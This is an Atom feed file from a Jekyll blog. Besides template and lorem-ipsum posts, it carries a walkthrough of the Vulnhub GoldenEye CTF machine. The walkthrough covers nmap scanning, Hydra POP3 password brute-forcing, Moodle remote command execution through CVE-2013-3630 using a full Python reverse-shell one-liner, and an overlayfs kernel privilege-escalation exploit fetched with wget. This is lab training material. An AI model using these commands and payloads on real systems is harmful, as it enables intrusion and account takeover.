@@ -1,0 +1,425 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-01-03T22:52:30+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">joona.xyz</title><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2019/12/30/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-12-30T18:07:46+02:00</published><updated>2019-12-30T18:07:46+02:00</updated><id>http://localhost:4000/jekyll/update/2019/12/30/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/12/30/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Vulnhub - GoldenEye Walkthrough</title><link href="http://localhost:4000/2019/12/30/vulnhub-goldeneye.html" rel="alternate" type="text/html" title="Vulnhub - GoldenEye Walkthrough" /><published>2019-12-30T00:00:00+02:00</published><updated>2019-12-30T00:00:00+02:00</updated><id>http://localhost:4000/2019/12/30/vulnhub-goldeneye</id><content type="html" xml:base="http://localhost:4000/2019/12/30/vulnhub-goldeneye.html">&lt;p&gt;&lt;img src=&quot;/images/goldeneye/goldeneye-header.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/goldeneye-1,240/&quot;&gt;GoldenEye&lt;/a&gt; is a James Bond themed vulnerable machine created by &lt;a href=&quot;https://www.vulnhub.com/author/creosote,584/&quot;&gt;creosote&lt;/a&gt;.
+It is ranked as intermediate level and more CTF-like than realistic.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Let’s start with an nmap scan.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;nmap -p- -A -T4 10.10.11.133 -oA nmap/goldeneye&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; scan all ports&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-A&lt;/code&gt; does OS detection (-O), version detection (-sV) and script scanning (-sC)&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-T4&lt;/code&gt; set timing template higher to speed things up&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-oA&lt;/code&gt; output in all formats&lt;/p&gt;
+
+&lt;p&gt;Looking at the results we have ports 25 (SMTP), 80 (HTTP) and 55007 (POP3) open.&lt;br /&gt;
+Let’s check the HTTP port first. We get a webpage with the following text:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Severnaya Auxiliary Control Station&lt;br /&gt;
+&lt;strong&gt;**TOP SECRET ACCESS&lt;/strong&gt;**&lt;br /&gt;
+Accessing Server Identity&lt;br /&gt;
+Server Name:…………….&lt;br /&gt;
+GOLDENEYE&lt;br /&gt;&lt;br /&gt;
+User: UNKNOWN&lt;br /&gt;
+Navigate to /sev-home/ to login&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If we try to navigate to 10.10.11.133/sev-home/ we get an authentication prompt.
+Looking at the websites source code there’s an interesting JavaScript file called &lt;code class=&quot;highlighter-rouge&quot;&gt;terminal.js&lt;/code&gt;.
+Inside that script there’s a comment with Boris’ password.&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/terminaljs.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The password is HTML encoded, which you can decode with Burp Suite or any online HTML decoder.
+It decodes to &lt;code class=&quot;highlighter-rouge&quot;&gt;InvincibleHack3r&lt;/code&gt;.
+Take note that user &lt;code class=&quot;highlighter-rouge&quot;&gt;Natalya&lt;/code&gt; is also mentioned. We now have two users: Boris and Natalya.&lt;/p&gt;
+
+&lt;p&gt;Let’s login to /sev-home/ with &lt;code class=&quot;highlighter-rouge&quot;&gt;Boris:InvincibleHack3r&lt;/code&gt;. We get a webpage with a message that
+hints to check pop3 service.&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/sevhome.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The credentials we currently have does not work on pop3 login though.
+We can try to brute-force the password with &lt;code class=&quot;highlighter-rouge&quot;&gt;Hydra&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;hydra -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-l&lt;/code&gt; username&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-P&lt;/code&gt; password file&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-s&lt;/code&gt; specify the port because it’s not the default pop3 port&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-V&lt;/code&gt; verbose, prints out every tried password&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;It took quite a few tries to find the correct password file, but we now have the password:&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/hydrabob.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lesson learned; don’t just throw rockyou.txt at everything :)&lt;/p&gt;
+
+&lt;p&gt;Before we start rummaging through Boris’ private emails, let’s start brute-forcing Natalya’s pop3
+password in the background.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Connect to the pop3 server:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;nc 10.10.11.133 55007&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;pop3 commands:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;USER boris&lt;/code&gt; login name&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;PASS secret1!&lt;/code&gt; password&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;LIST&lt;/code&gt; list messages&lt;/p&gt;
+
+&lt;p&gt;Print out an email with &lt;code class=&quot;highlighter-rouge&quot;&gt;RETR &amp;lt;message-number&amp;gt;&lt;/code&gt; command.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Email 1:&lt;br /&gt;
+From: root@127.0.0.1.goldeneye&lt;br /&gt;
+Boris, this is admin. You can electronically communicate to co-workers and students here. I’m not going to scan emails for security risks
+because I trust you and the other admins here.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Email 2:&lt;br /&gt;
+From: natalya@ubuntu&lt;br /&gt;
+Boris, I can break your codes!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Email 3:&lt;br /&gt;
+From: alec@janus.boss&lt;br /&gt;
+Boris,
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!&lt;br /&gt;&lt;br /&gt;
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages….&lt;br /&gt;
+PS - Keep security tight or we will be compromised.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Nothing too interesting, but we do get new potential usernames: &lt;code class=&quot;highlighter-rouge&quot;&gt;Xenia&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;alec&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Behind the scenes we have also cracked Natalya’s pop3 password:&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/popnata.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Email 1:&lt;br /&gt;
+From: root@ubuntu&lt;br /&gt;
+Natalya, please you need to stop breaking boris’ codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.&lt;br /&gt;&lt;br /&gt;
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Email 2:&lt;br /&gt;
+From: root@ubuntu&lt;br /&gt;
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it’s related to security…even if it’s not, just enter it in under the guise of “security”…it’ll get the change order escalated without much hassle :)&lt;br /&gt;&lt;br /&gt;
+Ok, user creds are:&lt;br /&gt;
+username: xenia&lt;br /&gt;
+password: RCP90rulez!&lt;br /&gt;&lt;br /&gt;
+Boris verified her as a valid contractor so just create the account ok?
+And if you didn’t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+&lt;strong&gt;Make sure to edit your host file since you usually work remote off-network….
+Since you’re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We have a username and a password to internal training website severnaya-station.com/gnocertdir.&lt;br /&gt;
+If we just try navigating to 10.10.11.133/gnocertdir we get an error &lt;code class=&quot;highlighter-rouge&quot;&gt;Incorrect access detected.&lt;/code&gt;
+We need to point the server’s IP to severnaya-station.com.&lt;br /&gt;&lt;br /&gt;
+This can be done by adding &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.11.133 severnaya-station.com&lt;/code&gt; to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;-file.&lt;/p&gt;
+
+&lt;p&gt;Navigating to severnaya-station.com/gnocertdir we get a “GoldenEye Operators Training” Moodle platform.
+After logging in as &lt;code class=&quot;highlighter-rouge&quot;&gt;Xenia&lt;/code&gt; and enumerating the site we see that we have received a private message:&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/xen.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;A new username &lt;code class=&quot;highlighter-rouge&quot;&gt;doak&lt;/code&gt; and a mention about emails. Let’s give doak the good ol’ Hydra-pop3 treatment:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;hydra -l doak -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We manage to get the password &lt;code class=&quot;highlighter-rouge&quot;&gt;goat&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Email 1:&lt;br /&gt;
+From: doak@ubuntu&lt;br /&gt;
+James,
+If you’re reading this, congrats you’ve gotten this far. You know how tradecraft works right?&lt;br /&gt;
+Because I don’t. Go to our training site and login to my account….dig until you can exfiltrate further information……&lt;br /&gt;&lt;br /&gt;
+username: dr_doak&lt;br /&gt;
+password: 4England!&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Doak was expecting us to get into his email and he has hidden something on the training platform.
+Logging in as him and navigating to his profile, there’s a section called My private files.&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/forjames.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;s3cret.txt:&lt;br /&gt;
+007,&lt;br /&gt;
+I was able to capture this apps adm1n cr3ds through clear txt.&lt;br /&gt;
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
+Something juicy is located here: /dir007key/for-007.jpg&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;At 10.10.11.133/dir007key/for-007.jpg we have a picture of Dr. Doak:&lt;br /&gt;
+&lt;img src=&quot;/images/goldeneye/doakster.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The credentials are probably hidden inside this image, so let’s do some CTF work.&lt;br /&gt;
+First download the image with &lt;code class=&quot;highlighter-rouge&quot;&gt;wget 10.10.11.133/dir007key/for-007.jpg&lt;/code&gt;.&lt;br /&gt;
+Checking the image’s EXIF-data with &lt;code class=&quot;highlighter-rouge&quot;&gt;exiftool for-007.jpg&lt;/code&gt; we see an interesting string:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;Image Description: eFdpbnRlcjE5OTV4IQ==&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The strings is encoded with base64. Decoding it with &lt;code class=&quot;highlighter-rouge&quot;&gt;echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d&lt;/code&gt; we get password: &lt;code class=&quot;highlighter-rouge&quot;&gt;xWinter1995x!&lt;/code&gt;.
+This is the admin password to the training platform.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;
+
+&lt;p&gt;Enumerating the site as admin we find the Moodle version &lt;code class=&quot;highlighter-rouge&quot;&gt;2.2.3&lt;/code&gt;.
+If we Google exploits for this, we find a remote command execution vulnerability &lt;a href=&quot;https://www.exploit-db.com/exploits/29324&quot;&gt;CVE-2013-3630&lt;/a&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So if we change the path for spellchecker, let’s say to and run it, we get a reverse shell.&lt;br /&gt;
+Spellchecker path -setting is at &lt;strong&gt;Home &amp;gt; Site administration &amp;gt; Server &amp;gt; System paths.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we can exploit this we have to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;Spell engine&lt;/code&gt; from default “Google Spell” to “PSpellShell” at &lt;strong&gt;Home &amp;gt; Site administration &amp;gt;
+Plugins &amp;gt; Text editors &amp;gt; TinyMCE HTML editor&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now that we have the spellchecker path and spell engine changed we can set up a netcat listener on our host:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvnp 1337&lt;/code&gt;.&lt;br /&gt;
+After that go to the training platform and create a new blogpost.
+In the text-editor there is a button for spell-checking.
+Click that and you should now have a reverse shell as user &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I used the usual Python reverse shell as the spellchecker path:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.x.x.x”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;The machine has &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; so you could easily download an enumeration script.
+But for this we only need to check the kernel version with &lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This kernel version is vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;overlayfs&lt;/code&gt; local privilege escalation (&lt;a href=&quot;https://www.exploit-db.com/exploits/37292&quot;&gt;CVE-2015-1328&lt;/a&gt;).&lt;br /&gt;
+Download the exploit to your machine. Edit the comments out and set up a simple Python HTTP server:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -m http.server&lt;/code&gt;.&lt;br /&gt;
+On the target machine let’s move to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; folder and download the exploit:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;wget your-ip:8000/ofs.c&lt;/code&gt;.&lt;br /&gt;
+Give execution permissions to the file &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x ofs.c&lt;/code&gt; and run it. We get an error: &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc: not found&lt;/code&gt;.
+The exploit tries to compile the code with gcc, but gcc is not installed on the target machine.&lt;/p&gt;
+
+&lt;p&gt;Check for other compilers with &lt;code class=&quot;highlighter-rouge&quot;&gt;which cc&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;which g++&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;cc&lt;/code&gt; seems to be installed so let’s edit our exploit. &lt;br /&gt;
+Call for &lt;strong&gt;gcc&lt;/strong&gt; is on line 109:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);&lt;/code&gt;.&lt;br /&gt;
+Switch it to use &lt;strong&gt;cc&lt;/strong&gt;:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;lib = system(&quot;cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now we can run the exploit and we get a root shell.
+The flag is inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; folder:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Alec told me to place the codes here:&lt;br /&gt;
+flag&lt;br /&gt;
+If you captured this make sure to go here…..&lt;br /&gt;
+/006-final/xvf7-flag/&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/goldeneye/flag.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thank you for reading :)&lt;/p&gt;</content><author><name>joona</name></author><summary type="html"></summary></entry><entry><title type="html">My Example Post</title><link href="http://localhost:4000/2016/05/20/my-example-post.html" rel="alternate" type="text/html" title="My Example Post" /><published>2016-05-20T00:00:00+03:00</published><updated>2016-05-20T00:00:00+03:00</updated><id>http://localhost:4000/2016/05/20/my-example-post</id><content type="html" xml:base="http://localhost:4000/2016/05/20/my-example-post.html">&lt;p&gt;Eos eu docendi tractatos sapientem, brute option menandri in vix, quando vivendo accommodare te ius. Nec melius fastidii constituam id, viderer theophrastus ad sit, hinc semper periculis cum id. Noluisse postulant assentior est in, no choro sadipscing repudiandae vix. Vis in euismod delenit dignissim. Ex quod nostrum sit, suas decore animal id ius, nobis solet detracto quo te.&lt;/p&gt;
+
+&lt;p&gt;No laudem altera adolescens has, volumus lucilius eum no. Eam ei nulla audiam efficiantur. Suas affert per no, ei tale nibh sea. Sea ne magna harum, in denique scriptorem sea, cetero alienum tibique ei eos. Labores persequeris referrentur eos ei.&lt;/p&gt;
+
+&lt;p&gt;asd&lt;/p&gt;</content><author><name></name></author><summary type="html">Eos eu docendi tractatos sapientem, brute option menandri in vix, quando vivendo accommodare te ius. Nec melius fastidii constituam id, viderer theophrastus ad sit, hinc semper periculis cum id. Noluisse postulant assentior est in, no choro sadipscing repudiandae vix. Vis in euismod delenit dignissim. Ex quod nostrum sit, suas decore animal id ius, nobis solet detracto quo te.</summary></entry><entry><title type="html">Some articles are just so long they deserve a really long title to see if things will break well</title><link href="http://localhost:4000/misc/2016/05/20/super-long-article.html" rel="alternate" type="text/html" title="Some articles are just so long they deserve a really long title to see if things will break well" /><published>2016-05-20T00:00:00+03:00</published><updated>2016-05-20T00:00:00+03:00</updated><id>http://localhost:4000/misc/2016/05/20/super-long-article</id><content type="html" xml:base="http://localhost:4000/misc/2016/05/20/super-long-article.html">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+
+&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+
+&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;</content><author><name></name></author><summary type="html">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.</summary></entry><entry><title type="html">This post demonstrates post content styles</title><link href="http://localhost:4000/junk/2016/05/20/this-post-demonstrates-post-content-styles.html" rel="alternate" type="text/html" title="This post demonstrates post content styles" /><published>2016-05-20T00:00:00+03:00</published><updated>2016-05-20T00:00:00+03:00</updated><id>http://localhost:4000/junk/2016/05/20/this-post-demonstrates-post-content-styles</id><content type="html" xml:base="http://localhost:4000/junk/2016/05/20/this-post-demonstrates-post-content-styles.html">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.&lt;/p&gt;
+
+&lt;h2 id=&quot;some-great-heading-h2&quot;&gt;Some great heading (h2)&lt;/h2&gt;
+
+&lt;p&gt;Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu.&lt;/p&gt;
+
+&lt;p&gt;Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+
+&lt;h2 id=&quot;another-great-heading-h2&quot;&gt;Another great heading (h2)&lt;/h2&gt;
+
+&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.&lt;/p&gt;
+
+&lt;h3 id=&quot;some-great-subheading-h3&quot;&gt;Some great subheading (h3)&lt;/h3&gt;
+
+&lt;p&gt;Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum.&lt;/p&gt;
+
+&lt;p&gt;Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.&lt;/p&gt;
+
+&lt;h3 id=&quot;some-great-subheading-h3-1&quot;&gt;Some great subheading (h3)&lt;/h3&gt;
+
+&lt;p&gt;Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This quote will change your life. It will reveal the secrets of the universe, and all the wonders of humanity. Don’t misuse it.&lt;/p&gt;
+&lt;/blockquote&gt;
+
